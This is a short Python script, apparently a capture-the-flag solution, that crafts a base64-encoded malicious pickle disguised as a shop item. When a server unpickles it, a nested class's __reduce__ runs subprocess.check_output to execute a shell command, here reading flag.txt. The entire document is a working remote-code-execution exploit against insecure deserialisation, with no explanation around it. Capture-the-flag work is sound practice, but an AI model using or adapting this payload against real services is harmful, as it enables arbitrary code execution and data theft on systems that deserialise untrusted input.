import pickle
import base64
import subprocess
from types import SimpleNamespace

payload = ['cat', 'flag.txt']

class FakeItem:
    def __init__(self):
        self.name = 'Hacked!'
        self.description = RCE()
        self.image = 'https://media.tenor.com/Ce309bmw-fQAAAAM/be.gif'
        self.price = '13.37'

    def __reduce__(self):
        return SimpleNamespace(**self.__dict__).__reduce__()

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (payload, ))

if __name__ == '__main__':
    print(base64.urlsafe_b64encode(pickle.dumps(FakeItem())).decode('ascii'))
